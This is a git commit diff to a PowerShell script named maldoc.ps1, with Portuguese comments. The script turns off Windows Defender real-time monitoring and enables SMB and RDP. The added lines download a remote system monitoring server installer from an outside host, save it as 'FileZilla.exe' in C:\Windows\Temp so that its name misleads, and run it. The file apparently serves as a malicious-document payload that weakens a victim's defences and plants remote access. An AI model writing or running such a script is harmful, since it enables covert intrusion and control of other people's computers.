0222d872c24cb998e97b6eaf78cd2cd33eb00f23
jovair1994 <68813860+jovair1994@users.noreply.github.com>
2024-01-02 18:19:07 -0300

    Update maldoc.ps1

--- maldoc.ps1
+++ maldoc.ps1
@@ -1,5 +1,3 @@
-
-Set-MpPreference -ExclusionExtension ".exe"
 Set-MpPreference -DisableRealtimeMonitoring $true
 
 # Habilite o serviço SMB
@@ -9,4 +7,19 @@ Start-Service -Name "LanmanServer"
 # Habilite o serviço RDP
 
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
+# Defina a URL do download do FileZilla
+$FileZillaDownloadURL = "https://www.trigonesoft.com/download/Remote_System_monitor_Server_3.83_x64_Setup.exe"
+
+# Defina o caminho de destino onde o arquivo será baixado
+$DownloadPath = "C:\Windows\Temp\FileZilla.exe"
+
+# Baixe o arquivo usando o URL
+Invoke-WebRequest -Uri $FileZillaDownloadURL -OutFile $DownloadPath
+
+# Execute o instalador do Trigone
+Start-Process -FilePath $DownloadPath -Wait
+
+# Aguarde a instalação ser concluÃ­da
+Start-Sleep -Seconds 100  # Ajuste o tempo de espera conforme necessário
 
